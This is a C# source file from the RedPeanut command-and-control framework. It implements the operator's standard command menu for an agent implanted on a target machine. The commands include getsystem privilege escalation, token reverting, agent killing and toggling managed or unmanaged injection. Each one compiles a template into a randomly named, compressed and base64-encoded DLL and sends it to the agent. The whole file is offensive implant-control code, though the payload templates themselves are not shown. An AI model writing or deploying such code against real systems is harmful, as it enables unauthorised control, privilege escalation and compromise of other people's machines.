//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;
using static RedPeanut.Models;

namespace RedPeanut
{
    public class StandardCommand 
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "pwd", "Get current Directory" },
            { "getuid", "Set username" },
            { "getsystem", "Set SYSTEM" },
            { "killagent", "Kill current agent" },
            { "managed", "Agent will run task in managed mode" },
            { "unmanaged", "Agent will run task in unmanaged mode" },
            { "reverttoself", "Revert all token" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, null);
            return;
        }

        IAgentInstance agent = null;

        string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);


        public StandardCommand()
        {

        }

        public StandardCommand(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public bool Execute(string input)
        {
            return StandardMenu(input);
        }

        private bool StandardMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "pwd":
                            RunPwd();
                            return true;
                        case "getuid":
                            RunGetUid();
                            return true;
                        case "getsystem":
                            RunGetSystem();
                            return true;
                        case "reverttoself":
                            RunReverToSelf();
                            return true;
                        case "killagent":
                            RunKillAgent();
                            return true;
                        case "managed":
                            RunSetManaged();
                            return true;
                        case "unmanaged":
                            RunSetUnManaged();
                            return true;
                        default:
                            return false;
                    }
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        private void RunPwd()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetPwd", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunGetUid()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetUid", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunGetSystem()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "GetSystem", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunReverToSelf()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "RevertToSelf", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunKillAgent()
        {
            string source = File.ReadAllText(Path.Combine(folderrpath, STANDARD_TEMPLATE));

            string commandstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", agent.TargetFramework, compprofile: CompilationProfile.StandardCommand)));

            RunStandardBase64(commandstr, "KillAgent", "StandardCommandImpl.Program", new string[] { " " }, agent);
        }

        private void RunSetManaged()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "managed"
            };

            InjectionManaged injectionManagedTask = new InjectionManaged();
            injectionManagedTask.Managed = true;

            msg.InjectionManagedTask = injectionManagedTask;

            agent.SendCommand(msg);
        }

        private void RunSetUnManaged()
        {
            TaskMsg msg = new TaskMsg
            {
                Instanceid = RandomAString(10, new Random()),
                Agentid = agent.AgentId,
                TaskType = "managed"
            };

            InjectionManaged injectionManagedTask = new InjectionManaged();
            injectionManagedTask.Managed = false;

            msg.InjectionManagedTask = injectionManagedTask;

            agent.SendCommand(msg);
        }
    }
}
